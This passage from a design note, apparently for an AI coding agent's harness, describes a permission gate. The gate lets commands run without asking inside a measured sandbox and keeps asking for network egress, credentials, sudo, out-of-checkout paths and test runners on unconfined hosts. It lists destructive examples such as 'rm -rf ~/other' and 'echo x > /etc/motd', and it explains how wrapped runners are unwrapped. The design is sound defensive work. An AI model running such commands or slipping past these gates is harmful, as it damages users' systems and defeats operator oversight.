   than `Boundary::complete`, on purpose: an untested seal makes the claim *nothing here can
   escape* a claim with its evidence missing, and the ruling is about a boundary that is really
   there. The reaper (a cgroup on this box, a process group on a remote) is not a fact of
   `Boundary`; a boundary only ever reaches the gate through a process host that was built with
   one, so the two arrive together or not at all.
2. **The call needs no egress.** No `network` intent, and the boundary denies egress anyway —
   both, because either alone leaves a door. `curl`, `cargo fetch`, `git push` and `npm install`
   all still ask. (`cargo fetch` did **not** carry a `network` intent until this slice: the table
   in `intent.rs` named `install`/`publish`/`add`/`update` and not `fetch`, so a gate asking
   *does this need the network?* answered no about the one command whose whole job it is.)
3. **No grant would have to widen the view.** Every region layer A placed is inside the
   session's own work: `Region::is_outside` is the tree's one answer to that question, reused
   rather than restated. `rm -rf target` is inside; `rm -rf ~/other`, `echo x > /etc/motd` and
   `rm -rf $X` are not, and still ask.
4. **Not an always-ask tier.** `Tier::AlwaysAsk` never reaches here — `Mode::admits_unasked`
   refuses it at every point whatever the boundary — and `Tier::Blocked` is refused before the
   mode is read at all.

**The row says why**: `by: gate:boundary`, basis beginning *"admitted: inside the measured
boundary (D16)."* and naming the mechanism that measured it (`bubblewrap 0.11.1`). The
operator is **also told**, which the row alone could not do: the audit rows are read by `/gate`
and by the corpus, and neither scrolls while the work happens. One transcript line per
admission — `HubAdmissions` collects it from the gate, `Harness::flush_gate_admissions` writes
it at the round boundary, after the round's results and never between a call and its result.

### What still asks

Everything that crosses the boundary, and everything the boundary does not contain:

| | why it still asks |
|---|---|
| `curl`, `cargo fetch`, `npm install`, `ssh host` | network egress; and the boundary would deny it, so the card is where a wider view is decided |
| `git push` | the same, plus `version_control_publish` |
| `gh …` | the credential tier — `always-ask: credential_use`, unchanged |
| `sudo`, a delete outside the project, a host never seen | the always-ask list, unchanged at every point on the operator's box |
| a command naming a path outside the checkout | the region test above |
| **anything on an unconfined host** | no boundary, so the per-command ruling is the only defence there is |

The macOS host shell, an unconfined Linux host and a probe that did not answer are all the last
row: `AdjudicatedGate::with_boundary(None, refusal)` is the whole of that state, and none of
this fires.

### Which points, and why `automode` is left alone

`writes-allowed` **only**, which is the ruling's own sentence. `allow-all` already admits exec
unasked by its own definition (and by its own row, `gate:mode`). `automode` and
`automode-edits` still ask — and that is not an oversight: at those points the question is
answered by a **model**, not a card, so what D16 removes for the operator (an interruption) is
something those points do not have. Narrowing what an oracle is asked about would be a
calibration change, and the ruling did not make one.

### R98 (1) — where there is no boundary, the test file *is* the program

The same sentence read backwards. On a host with **no** measured boundary, a `bash` call whose
stages run a test runner, a build that executes project code, or a script in the checkout is
**not settled by a session grant or a durable rule**: it asks every time, and the card says why
(*"asks every time: it runs code the agent wrote (`cargo test`), and this host has no boundary
— a grant cannot stand in for the file that will exist by the next run (R98)"*).

- **What counts** (`crates/tools/src/project_code.rs`): `cargo test|run|build|bench|check|clippy`
  `|nextest|miri|doc-test` (a build script is project code and runs on `check` too), `pytest` and
  `python -m pytest`, `go test`, `npm test`/`npm run`, `make`/`just`, an interpreter handed a path
  in the checkout, and any program that is itself a path (`./scripts/test.sh`). Wrappers —
  `sudo`, `env`, `timeout` — are unwrapped first, because that is where a runner goes to hide.
- **How it binds**, at three places that must agree: the ladder offers no standing rung
  (`Offer`), the three arms that honour a standing answer skip it (session grants, the shape
  cache, the `permission` config's `allow`), and the two that would write one refuse. An answer
  naming a rung that was not offered is refused by the gate's own option check, so an older head
  cannot push one through either.
- **What it does not touch**: the tier, the boundary, and any command that is not this. `git
  status`, `cargo fmt`, `grep` and the rest keep their ladders, their grants and their shape
  cache — which the tests pin in the same breath, so a fix that narrowed every ladder would fail
  rather than pass quietly.

R98's second half — a sandbox on macOS — is not this section and not this slice.
